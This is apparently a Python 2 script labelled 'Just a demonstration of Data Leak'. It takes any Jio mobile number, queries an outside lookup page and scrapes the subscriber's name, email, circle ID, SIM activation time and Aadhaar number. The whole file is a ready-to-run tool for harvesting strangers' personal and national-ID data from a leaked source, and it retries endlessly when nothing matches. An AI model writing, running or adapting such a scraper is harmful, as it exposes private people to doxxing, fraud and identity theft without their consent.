from urllib import *
from re import search

def ping():
    data = urlencode({"Mobile":number,"submit":"Show"})
    result = urlopen("http://magicapk.com/jiosimdetail.php", data)
    html = result.read()
    find = search (r'\+91', html)
    if find:
        match = search (r'First Name:-<b><font color=red>[^<]*</font>', html)
        if match:
            print "\n\033[1;32m[+] First Name:\033[1;m", match.group().split('red>')[1][:-7]
            pass
        match = search (r'Last Name:-<b><font color=red>[^<]*</font>', html)
        if match:
            print "\n\033[1;32m[+] Last Name:\033[1;m", match.group().split('red>')[1][:-7]
            pass
        match = search (r'Email-Id:-<font color=red>[^<]*</font>', html)
        if match:
            print "\n\033[1;32m[+] Email Address:\033[1;m", match.group().split('red>')[1][:-7]
            pass
        match = search (r'circle-Id:-<font color=red>[^<]*</font>', html)
        if match:
            print "\n\033[1;32m[+] Circle-ID:\033[1;m", match.group().split('red>')[1][:-7]
            pass
        match = search (r'SIM Activation Date and Time:-<font color=red>[^<]*</font>', html)
        if match:
            print "\n\033[1;32m[+] SIM Activation Date and Time:\033[1;m", match.group().split('red>')[1][:-7]
            pass
        match = search (r'aadhaarNumber:-<font color=red>[^<]*</font>', html)
        if match:
            print "\n\033[1;32m[+] Aadhar Number:\033[1;m", match.group().split('red>')[1][:-7]
            pass
        else:
            pass
    else:
        ping()
print "\t\tAndroid Chirag : androidchirag.com"
print """

   ÛÛÛÛÛÛÛÛÛ                  ÛÛÛÛÛ                     ÛÛÛ      ÛÛÛÛÛ      ÛÛÛÛÛÛÛÛÛ  ÛÛÛÛÛ       ÛÛÛ                              
  ÛÛÛ°°°°°ÛÛÛ                °°ÛÛÛ                     °°°      °°ÛÛÛ      ÛÛÛ°°°°°ÛÛÛ°°ÛÛÛ       °°°                               
 °ÛÛÛ    °ÛÛÛ  ÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛ  ÛÛÛÛ   ÛÛÛÛÛÛÛ     ÛÛÛ     °°°  °ÛÛÛÛÛÛÛ   ÛÛÛÛ  ÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛ    ÛÛÛÛÛÛÛ
 °ÛÛÛÛÛÛÛÛÛÛÛ °°ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ °°ÛÛÛ°°ÛÛÛ ÛÛÛ°°ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ    °ÛÛÛ          °ÛÛÛ°°ÛÛÛ °°ÛÛÛ °°ÛÛÛ°°ÛÛÛ °°°°°ÛÛÛ  ÛÛÛ°°ÛÛÛ
 °ÛÛÛ°°°°°ÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ  °ÛÛÛ °°° °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ    °ÛÛÛ          °ÛÛÛ °ÛÛÛ  °ÛÛÛ  °ÛÛÛ °°°   ÛÛÛÛÛÛÛ °ÛÛÛ °ÛÛÛ
 °ÛÛÛ    °ÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ  °ÛÛÛ     °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ    °°ÛÛÛ     ÛÛÛ °ÛÛÛ °ÛÛÛ  °ÛÛÛ  °ÛÛÛ      ÛÛÛ°°ÛÛÛ °ÛÛÛ °ÛÛÛ
 ÛÛÛÛÛ   ÛÛÛÛÛ ÛÛÛÛ ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛ ÛÛÛÛÛ    °°ÛÛÛÛÛÛ  ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛ    °°ÛÛÛÛÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛ ÛÛÛÛÛ ÛÛÛÛÛ    °°ÛÛÛÛÛÛÛÛ°°ÛÛÛÛÛÛÛ
°°°°°   °°°°° °°°° °°°°°  °°°°°°°° °°°°°      °°°°°°  °°°°°  °°°°°°°°      °°°°°°°°°  °°°° °°°°° °°°°° °°°°°      °°°°°°°°  °°°°°ÛÛÛ
                                                                                                                            ÛÛÛ °ÛÛÛ
                                                                                                                           °°ÛÛÛÛÛÛ 
                                                                                                                            °°°°°°  


"""
print "\t\tJust a demonstration of Data Leak"
number = raw_input("Enter a Jio Number: ")
ping()
